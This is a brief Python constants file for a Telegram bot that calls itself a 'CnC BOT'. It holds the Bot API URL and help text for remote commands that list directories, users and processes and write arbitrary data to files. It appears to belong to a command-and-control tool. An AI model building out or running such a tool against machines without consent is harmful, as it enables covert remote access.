from authorization import TOKEN

URL = "https://api.telegram.org/bot{}".format(TOKEN)
DIR_HTML = "<b>Directory Listing</b>\n<i>Dir: {}</i>\n<b>Items:</b>\n\n"
USR_HTML = "<b>Active Users Listing</b>\n<b>Users:</b>\n\n"
PCS_HTML = "<b>Running Processes Listing</b>\n<b>Processes:</b>\n\n"
WRT_HTML = "<b>Write Status: </b>"
HELP = "Telegram CnC BOT\nUse:\nDirectory listing: ls [path]\nActive users: users\nRunning processes: processes\nWrite to file: write [path] [data]\n\nExit application: terminate\n"